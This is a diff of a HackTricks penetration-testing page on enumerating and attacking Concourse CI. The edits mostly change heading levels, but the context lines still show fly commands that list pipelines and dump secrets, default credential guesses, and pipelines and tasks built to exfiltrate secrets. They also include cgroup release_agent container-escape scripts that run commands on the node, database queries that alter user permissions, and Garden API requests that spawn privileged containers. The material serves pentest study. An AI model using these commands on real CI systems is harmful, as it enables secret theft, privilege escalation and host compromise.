@@ -1,4 +1,4 @@
-
+# Concourse Enumeration & Attacks
 
 <details>
 
@@ -16,8 +16,7 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 
 </details>
 
-
-# User Roles & Permissions
+## User Roles & Permissions
 
 Concourse comes with five roles:
 
@@ -33,14 +32,14 @@ Moreover, the **permissions of the roles owner, member, pipeline-operator and vi
 
 Note that Concourse **groups pipelines inside Teams**. Therefore users belonging to a Team will be able to manage those pipelines and **several Teams** might exist. A user can belong to several Teams and have different permissions inside each of them.
 
-# Vars & Credential Manager
+## Vars & Credential Manager
 
 In the YAML configs you can configure values using the syntax `((`_`source-name`_`:`_`secret-path`_`.`_`secret-field`_`))`.\
 The **source-name is optional**, and if omitted, the [cluster-wide credential manager](https://concourse-ci.org/vars.html#cluster-wide-credential-manager) will be used, or the value may be provided [statically](https://concourse-ci.org/vars.html#static-vars).\
-The **optional **_**secret-field**_ specifies a field on the fetched secret to read. If omitted, the credential manager may choose to read a 'default field' from the fetched credential if the field exists.\
+The **optional \_secret-field**\_ specifies a field on the fetched secret to read. If omitted, the credential manager may choose to read a 'default field' from the fetched credential if the field exists.\
 Moreover, the _**secret-path**_ and _**secret-field**_ may be surrounded by double quotes `"..."` if they **contain special characters** like `.` and `:`. For instance, `((source:"my.secret"."field:1"))` will set the _secret-path_ to `my.secret` and the _secret-field_ to `field:1`.
 
-## Static Vars
+### Static Vars
 
 Static vars can be specified in **tasks steps**:
 
@@ -57,7 +56,7 @@ Or using the following `fly` **arguments**:
 * `-i` or `--instance-var` `NAME=VALUE` parses `VALUE` as YAML and sets it as the value for the instance var `NAME`. See [Grouping Pipelines](https://concourse-ci.org/instanced-pipelines.html) to learn more about instance vars.
 * `-l` or `--load-vars-from` `FILE` loads `FILE`, a YAML document containing mapping var names to values, and sets them all.
 
-## Credential Management
+### Credential Management
 
 There are different ways a **Credential Manager can be specified** in a pipeline, read how in [https://concourse-ci.org/creds.html](https://concourse-ci.org/creds.html).\
 Moreover, Concourse supports different credential managers:
@@ -76,11 +75,11 @@ Moreover, Concourse supports different credential managers:
 Note that if you have some kind of **write access to Concourse** you can create jobs to **exfiltrate those secrets** as Concourse needs to be able to access them.
 {% endhint %}
 
-# Concourse Enumeration
+## Concourse Enumeration
 
 In order to enumerate a concourse environment you first need to **gather valid credentials** or to find an **authenticated token** probably in a `.flyrc` config file.
 
-## Login and Current User enum
+### Login and Current User enum
 
 * To login you need to know the **endpoint**, the **team name** (default is `main`) and a **team the user belongs to**:
   * `fly --target example login --team-name my-team --concourse-url https://ci.example.com [--insecure] [--client-cert=./path --client-key=./path]`
@@ -91,7 +90,7 @@ In order to enumerate a concourse environment you first need to **gather valid c
 * Get **role** of the user against the indicated target:
   * `fly -t <target> userinfo`
 
-## Teams & Users
+### Teams & Users
 
 * Get a list of the Teams
   * `fly -t <target> teams`
@@ -100,7 +99,7 @@ In order to enumerate a concourse environment you first need to **gather valid c
 * Get a list of users
   * `fly -t <target> active-users`
 
-## Pipelines
+### Pipelines
 
 * **List** pipelines:
   * `fly -t <target> pipelines -a`
@@ -123,7 +122,7 @@ cat /tmp/secrets.txt | sort | uniq
 rm /tmp/secrets.txt
 ```
 
-## Containers & Workers
+### Containers & Workers
 
 * List **workers**:
   * `fly -t <target> workers`
@@ -132,18 +131,18 @@ rm /tmp/secrets.txt
 * List **builds** (to see what is running):
   * `fly -t <target> builds`
 
-# Concourse Attacks
+## Concourse Attacks
 
-## Credentials Brute-Force
+### Credentials Brute-Force
 
 * admin:admin
 * test:test
 
-## Secrets and params enumeration
+### Secrets and params enumeration
 
 In the previous section we saw how you can **get all the secrets names and vars** used by the pipeline. The **vars might contain sensitive info** and the name of the **secrets will be useful later to try to steal** them.
 
-## Session inside running or recently run container
+### Session inside running or recently run container
 
 If you have enough privileges (**member role or more**) you will be able to **list pipelines and roles** and just get a **session inside** the `<pipeline>/<job>` **container** using:
 
@@ -158,7 +157,7 @@ With these permissions you might be able to:
 * Try to **escape** to the node
 * Enumerate/Abuse **cloud metadata** endpoint (from the pod and from the node, if possible)
 
-## Pipeline Creation/Modification
+### Pipeline Creation/Modification
 
 If you have enough privileges (**member role or more**) you will be able to **create/modify new pipelines.** Check this example:
 
@@ -193,7 +192,7 @@ With the **modification/creation** of a new pipeline you will be able to:
 * Enumerate/Abuse **cloud metadata** endpoint (from the pod and from the node)
 * **Delete** created pipeline
 
-## Execute Custom Task
+### Execute Custom Task
 
 This is similar to the previous method but instead of modifying/creating a whole new pipeline you can **just execute a custom task** (which will probably be much more **stealthier**):
 
@@ -219,7 +218,7 @@ params:
 fly -t tutorial execute --privileged --config task_config.yml
 ```
 
-## Escaping to the node from privileged task
+### Escaping to the node from privileged task
 
 In the previous sections we saw how to **execute a privileged task with concourse**. This won't give the container exactly the same access as the privileged flag in a docker container. For example, you won't see the node filesystem device in /dev, so the escape could be more "complex".
 
@@ -284,10 +283,10 @@ cat /output
 ```
 
 {% hint style="warning" %}
-As you might have noticed this is just a [**regular release\_agent escape**](../../linux-unix/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation.md#privileged) just modifying the path of the cmd in the node
+As you might have noticed this is just a [**regular release\_agent escape**](../../linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/#privileged) just modifying the path of the cmd in the node
 {% endhint %}
 
-## Escaping to the node from a Worker container
+### Escaping to the node from a Worker container
 
 A regular release\_agent escape with a minor modification is enough for this:
 
@@ -318,7 +317,7 @@ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 cat /output
 ```
 
-## Escaping to the node from the Web container
+### Escaping to the node from the Web container
 
 Even if the web container has some defenses disabled it's **not running as a common privileged container** (for example, you **cannot** **mount** and the **capabilities** are very **limited**, so all the easy ways to escape from the container are useless).
 
@@ -358,7 +357,7 @@ select * from teams; #Change the permissions of the users in the teams
 select * from users;
 ```
 
-## Abusing Garden Service - Not a real Attack
+### Abusing Garden Service - Not a real Attack
 
 {% hint style="warning" %}
 This are just some interesting notes about the service, but because it's only listening on localhost, this notes won't present any impact we haven't already exploited before
@@ -390,7 +389,7 @@ In the previous section we saw how to escape from a privileged container, so if 
 
 Note that playing with concourse I noted that when a new container is spawned to run something, the container processes are accessible from the worker container, so it's like a container creating a new container inside of it.
 
-### Getting inside a running privileged container
+#### Getting inside a running privileged container
 
 ```bash
 # Get current container
@@ -411,7 +410,7 @@ wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],
 nsenter --target 76011 --mount --uts --ipc --net --pid -- sh
 ```
 
-### Creating a new privileged container
+#### Creating a new privileged container
 
 You can very easily create a new container (just run a random UID) and execute something on it:
 
@@ -450,7 +449,6 @@ User-Agent: Go-http-client/1.1.
 Accept-Encoding: gzip.
 ```
 
-
 <details>
 
 <summary><strong>Support HackTricks and get benefits!</strong></summary>
@@ -466,5 +464,3 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 **Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
 
 </details>
-
-
